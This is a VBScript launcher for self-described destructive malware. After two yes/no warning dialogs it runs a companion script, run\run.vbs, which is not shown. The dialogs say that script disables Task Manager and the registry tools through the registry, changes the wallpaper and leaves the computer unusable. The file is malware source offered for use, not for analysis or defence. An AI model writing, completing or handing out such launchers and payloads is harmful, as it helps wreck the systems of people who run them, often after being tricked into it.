Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Warning = MsgBox("WARNING: This Malware is really destructive which makes it a little efficient, Do you want to proceed?", vbYesNoCancel + vbQuestion, "Question")

Function run()
    shell.run fso.GetParentFolderName(WScript.ScriptFullName) & "\run\run.vbs"
End Function

Select Case Warning
    Case vbYes
        FinalWarning = MsgBox("FINAL WARNING: If you want to proceed then your task manager will be disabled by using registry, your wallpaper will change, your registry tools will be disabled, and your computer will become unusable.", vbYesNoCancel + vbQuestion, "Question")
        Select Case FinalWarning
            Case vbYes
                run
            Case vbNo
                WScript.Quit
        End Select
    Case vbNo
        WScript.Quit
End Select
